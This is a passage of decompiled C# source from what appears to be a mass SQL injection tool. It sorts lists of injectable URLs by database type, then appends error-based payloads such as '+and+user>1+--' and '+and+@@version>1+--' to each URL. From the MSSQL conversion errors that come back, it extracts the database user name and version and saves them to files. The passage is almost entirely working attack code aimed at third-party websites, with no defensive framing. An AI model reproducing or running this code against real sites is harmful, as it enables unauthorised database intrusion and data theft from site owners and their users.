		txt_injectionstatus.set_Text("Sorting Status: 0/" + Conversions.ToString(num7));
		checked
		{
			RichTextBox val;
			while (num <= Information.UBound(array, 1))
			{
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null));
				Array array5 = Strings.Split(text, "://", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array5, new object[1] { 1 }, (string[])null));
				Array array6 = Strings.Split(text, "/", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array6, new object[1] { 0 }, (string[])null));
				text2 = Conversions.ToString(Operators.ConcatenateObject((object)"/", NewLateBinding.LateIndexGet((object)array6, new object[1] { 1 }, (string[])null)));
				text3 = DoSocketGet(text, text2);
				Application.DoEvents();
				for (; unchecked(i <= Information.UBound(array2, 1) && num6 == 0); i++)
				{
					if (Strings.InStr(text3, Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { i }, (string[])null)), (CompareMethod)0) != 0)
					{
						Application.DoEvents();
						val = txt_mysql;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n"))));
						Application.DoEvents();
						text4 = Conversions.ToString(Operators.ConcatenateObject((object)text4, Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n")));
						num2++;
						num6 = 1;
					}
				}
				for (; unchecked(k <= Information.UBound(array4, 1) && num6 == 0); k++)
				{
					if (Strings.InStr(text3, Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { k }, (string[])null)), (CompareMethod)0) != 0)
					{
						Application.DoEvents();
						val = txt_access;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n"))));
						Application.DoEvents();
						text6 = Conversions.ToString(Operators.ConcatenateObject((object)text6, Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n")));
						num4++;
						num6 = 1;
					}
				}
				for (; unchecked(j <= Information.UBound(array3, 1) && num6 == 0); j++)
				{
					if (Strings.InStr(text3, Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { j }, (string[])null)), (CompareMethod)0) != 0)
					{
						Application.DoEvents();
						val = txt_mssql;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n"))));
						Application.DoEvents();
						text5 = Conversions.ToString(Operators.ConcatenateObject((object)text5, Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n")));
						num3++;
						num6 = 1;
					}
				}
				for (; unchecked(k <= Information.UBound(array4, 1) && num6 == 0); k++)
				{
					if (Strings.InStr(text3, Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { k }, (string[])null)), (CompareMethod)0) != 0)
					{
						Application.DoEvents();
						val = txt_access;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n"))));
						Application.DoEvents();
						text6 = Conversions.ToString(Operators.ConcatenateObject((object)text6, Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n")));
						num4++;
						num6 = 1;
					}
				}
				if (num6 == 0)
				{
					Application.DoEvents();
					val = txt_unknown;
					val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n"))));
					Application.DoEvents();
					text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null), (object)"\r\n")));
					num5++;
				}
				num++;
				i = 0;
				j = 0;
				k = 0;
				num6 = 0;
				txt_injectionstatus.set_Text("Sorting Status: " + Conversions.ToString(num) + "/" + Conversions.ToString(num7 + 1));
			}
			object obj = ((FileDialog)Open).get_FileName() + "_mysql.txt";
			object obj2 = ((FileDialog)Open).get_FileName() + "_mssql.txt";
			object obj3 = ((FileDialog)Open).get_FileName() + "_access.txt";
			object obj4 = ((FileDialog)Open).get_FileName() + "_unknown.txt";
			Application.DoEvents();
			File.WriteAllText(Conversions.ToString(obj), text4);
			Application.DoEvents();
			File.WriteAllText(Conversions.ToString(obj2), text5);
			Application.DoEvents();
			File.WriteAllText(Conversions.ToString(obj3), text6);
			Application.DoEvents();
			File.WriteAllText(Conversions.ToString(obj4), text7);
			Application.DoEvents();
			MessageBox.Show("Done sorting! Found " + Conversions.ToString(num2) + " MySQL Injections, " + Conversions.ToString(num3) + " MSSQL Injections, " + Conversions.ToString(num4) + " Access Injections, and " + Conversions.ToString(num5) + " Unknown Injections! The new files have been saved. Check the sorting tab for information.");
			val = txt_status;
			val.set_Text(val.get_Text() + "Done sorting! Found " + Conversions.ToString(num2) + " MySQL Injections, " + Conversions.ToString(num3) + " MSSQL Injections, " + Conversions.ToString(num4) + " Access Injections, and " + Conversions.ToString(num5) + " Unknown Injections! \r\n");
			val = txt_status;
			val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)"The MySQL Injections have been saved to ", obj), (object)"\r\n"))));
			val = txt_status;
			val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)"The MSSQL Injections have been saved to ", obj2), (object)"\r\n"))));
			val = txt_status;
			val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)"The Access Injections have been saved to ", obj3), (object)"\r\n"))));
			val = txt_status;
			val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)"The Unknown Injections have been saved to", obj4), (object)"\r\n"))));
		}
	}

	private void btn_user_Click(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a5: Unknown result type (might be due to invalid IL or missing references)
		((CommonDialog)Open).ShowDialog();
		if (((FileDialog)Open).get_FileName().Length == 0)
		{
			MessageBox.Show("You must choose a file of injections to test!");
			return;
		}
		int num = 0;
		string text = "";
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string text5 = "";
		string text6 = "";
		string text7 = "";
		int num2 = 0;
		int num3 = 0;
		Application.DoEvents();
		Array array = File.ReadAllLines(((FileDialog)Open).get_FileName());
		Application.DoEvents();
		checked
		{
			txt_injectionstatus.set_Text("UserCheck Status: 0/0/" + Conversions.ToString(Information.UBound(array, 1) + 1));
			RichTextBox val;
			while (num <= Information.UBound(array, 1))
			{
				num3 = 0;
				text = Strings.Replace(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), "='", "=", 1, -1, (CompareMethod)0);
				Array array2 = Strings.Split(text, "://", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null));
				Array array3 = Strings.Split(text, "/", 2, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
				text2 = Conversions.ToString(Operators.ConcatenateObject((object)"/", NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)));
				text3 = Conversions.ToString(Operators.ConcatenateObject((object)"/", NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)));
				text2 = Strings.Replace(text2, "&", "+and+user>1+--&", 1, -1, (CompareMethod)0);
				text2 += "+and+user>1+--";
				text3 = Strings.Replace(text3, "&", "'+and+user>1+--&", 1, -1, (CompareMethod)0);
				text3 += "'+and+user>1+--";
				Application.DoEvents();
				text4 = DoSocketGet(text, text2);
				Application.DoEvents();
				text5 = DoSocketGet(text, text3);
				Application.DoEvents();
				if (Strings.InStr(text4, "converting the nvarchar value", (CompareMethod)0) != 0)
				{
					Array array4 = Strings.Split(text4, "nvarchar value '", -1, (CompareMethod)0);
					array4 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 1 }, (string[])null)), "'", -1, (CompareMethod)0);
					text6 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 0 }, (string[])null));
					if (text6.Length > 0)
					{
						Application.DoEvents();
						val = txt_user;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("User: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n"))));
						Application.DoEvents();
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("User: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n")));
						num2++;
						num3 = 1;
					}
				}
				if (unchecked((uint)Strings.InStr(text5, "converting the nvarchar value", (CompareMethod)0) & (0u - ((num3 == 0) ? 1u : 0u))) != 0)
				{
					Array array4 = Strings.Split(text5, "nvarchar value '", -1, (CompareMethod)0);
					array4 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 1 }, (string[])null)), "'", -1, (CompareMethod)0);
					text6 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 0 }, (string[])null));
					if (text6.Length > 0)
					{
						Application.DoEvents();
						val = txt_user;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("User: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n"))));
						Application.DoEvents();
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("User: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n")));
					}
				}
				num++;
				Application.DoEvents();
				txt_injectionstatus.set_Text("UserCheck Status: " + Conversions.ToString(num2) + "/" + Conversions.ToString(num + 1) + "/" + Conversions.ToString(Information.UBound(array, 1) + 1));
				Application.DoEvents();
			}
			Application.DoEvents();
			string text8 = ((FileDialog)Open).get_FileName() + "_users.txt";
			File.WriteAllText(text8, text7);
			val = txt_status;
			val.set_Text(val.get_Text() + "Done sorting by Users. Found a total of " + Conversions.ToString(num2) + " users. \r\nThe users file was saved to " + text8 + "\r\n");
			MessageBox.Show("Done sorting by Users! Found a total of " + Conversions.ToString(num2) + " users. The files have been saved, check Status for more info.");
		}
	}

	private void btn_version_Click(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a5: Unknown result type (might be due to invalid IL or missing references)
		((CommonDialog)Open).ShowDialog();
		if (((FileDialog)Open).get_FileName().Length == 0)
		{
			MessageBox.Show("You must choose a file of injections to test!");
			return;
		}
		int num = 0;
		string text = "";
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string text5 = "";
		string text6 = "";
		string text7 = "";
		int num2 = 0;
		int num3 = 0;
		Application.DoEvents();
		Array array = File.ReadAllLines(((FileDialog)Open).get_FileName());
		Application.DoEvents();
		checked
		{
			txt_injectionstatus.set_Text("VersionCheck Status: 0/0/" + Conversions.ToString(Information.UBound(array, 1) + 1));
			RichTextBox val;
			while (num <= Information.UBound(array, 1))
			{
				num3 = 0;
				text = Strings.Replace(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), "='", "=", 1, -1, (CompareMethod)0);
				Array array2 = Strings.Split(text, "://", -1, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null));
				Array array3 = Strings.Split(text, "/", 2, (CompareMethod)0);
				text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 0 }, (string[])null));
				text2 = Conversions.ToString(Operators.ConcatenateObject((object)"/", NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)));
				text3 = Conversions.ToString(Operators.ConcatenateObject((object)"/", NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)));
				text2 = Strings.Replace(text2, "&", "+and+@@version>1+--&", 1, -1, (CompareMethod)0);
				text2 += "+and+@@version>1+--";
				text3 = Strings.Replace(text3, "&", "'+and+@@Version>1+--&", 1, -1, (CompareMethod)0);
				text3 += "'+and+@@version>1+--";
				Application.DoEvents();
				text4 = DoSocketGet(text, text2);
				Application.DoEvents();
				text5 = DoSocketGet(text, text3);
				Application.DoEvents();
				if (Strings.InStr(text4, "converting the nvarchar value", (CompareMethod)0) != 0)
				{
					Array array4 = Strings.Split(text4, "nvarchar value '", -1, (CompareMethod)0);
					array4 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 1 }, (string[])null)), "'", -1, (CompareMethod)0);
					text6 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 0 }, (string[])null));
					if (text6.Length > 0)
					{
						Application.DoEvents();
						val = txt_version;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("Version: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n"))));
						Application.DoEvents();
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("User: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n")));
						num2++;
						num3 = 1;
					}
				}
				if (unchecked((uint)Strings.InStr(text5, "converting the nvarchar value", (CompareMethod)0) & (0u - ((num3 == 0) ? 1u : 0u))) != 0)
				{
					Array array4 = Strings.Split(text5, "nvarchar value '", -1, (CompareMethod)0);
					array4 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 1 }, (string[])null)), "'", -1, (CompareMethod)0);
					text6 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array4, new object[1] { 0 }, (string[])null));
					if (text6.Length > 0)
					{
						Application.DoEvents();
						val = txt_user;
						val.set_Text(Conversions.ToString(Operators.ConcatenateObject((object)val.get_Text(), Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("Version: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n"))));
						Application.DoEvents();
						text7 = Conversions.ToString(Operators.ConcatenateObject((object)text7, Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat("User: " + text6, "  Link: "), NewLateBinding.LateIndexGet((object)array, new object[1] { num }, (string[])null)), (object)"\r\n")));
					}
				}
				num++;
				Application.DoEvents();
				txt_injectionstatus.set_Text("VersionCheck Status: " + Conversions.ToString(num2) + "/" + Conversions.ToString(num + 1) + "/" + Conversions.ToString(Information.UBound(array, 1) + 1));
				Application.DoEvents();
			}
			Application.DoEvents();
			string text8 = ((FileDialog)Open).get_FileName() + "_versions.txt";
			File.WriteAllText(text8, text7);
			val = txt_status;
			val.set_Text(val.get_Text() + "Done sorting by Version. Found a total of " + Conversions.ToString(num2) + " versions. \r\nThe versions file was saved to " + text8 + "\r\n");
			MessageBox.Show("Done sorting by Versions! Found a total of " + Conversions.ToString(num2) + " versions. The files have been saved, check Status for more info.");
		}
	}
}
